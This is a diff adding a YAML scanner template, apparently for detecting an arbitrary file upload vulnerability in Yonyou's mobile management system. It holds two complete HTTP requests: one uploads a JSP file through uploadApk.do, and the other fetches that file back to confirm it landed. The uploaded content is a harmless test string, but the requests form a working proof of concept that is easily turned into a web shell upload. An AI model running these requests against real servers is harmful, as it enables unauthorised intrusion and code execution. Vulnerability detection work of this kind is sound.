@@ -1,0 +1,35 @@
+id:
+
+info:
+  name: 用友移动管理系统uploadApk.do接口任意文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /maportal/appmanager/uploadApk.dopk_obj=
+  headers:
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Cookie: JSESSIONID=C4E4D0BD20C3CC266B9091E656594B45.server; JSESSIONID=651D328AF33591493FB628C0A1E3BF06.server
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+  data: |
+    ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+    Content-Disposition: form-data; name="downloadpath"; filename="test1.jsp"
+    Content-Type: application/msword
+      
+    test
+  
+    ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
+response1:
+requests2:
+  method: GET
+  path: /maupload/apk/test1.jsp
+response2:
+  body: test
